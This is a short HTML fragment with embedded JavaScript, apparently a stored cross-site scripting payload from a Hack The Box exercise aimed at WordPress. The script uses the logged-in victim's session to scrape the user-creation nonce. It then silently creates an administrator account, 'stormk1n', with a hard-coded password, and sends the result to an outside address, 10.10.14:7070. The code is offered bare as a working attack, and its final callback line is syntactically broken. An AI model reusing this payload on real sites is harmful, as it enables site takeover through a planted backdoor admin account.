</div></td></tr></tbody><script>
fetch('/wp-admin/user-new.php', {credentials: 'include'})
  .then(r => r.text())
  .then(h => {
    let n = (h.match(/name="_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/)||[h.match(/id="_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/),])[1];
    
    let p = new URLSearchParams();
    p.set('action', 'createuser');
    p.set('_wpnonce_create-user', n);
    p.set('_wp_http_referer', '/wp-admin/user-new.php');
    p.set('user_login', 'stormk1n');
    p.set('email', 'stormk1n@htb.htb');
    p.set('pass1', 'P@$$word1234!');
    p.set('pass2', 'P@$$word1234!');
    p.set('role', 'administrator');
    p.set('createuser', 'Add New User');
    p.set('pw_weak', '1');
    
    fetch('/wp-admin/user-new.php', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: p
    }).then(r => {
      new fetch('http://10.10.14:7070'+ r.status;)
    });
  });
</script>
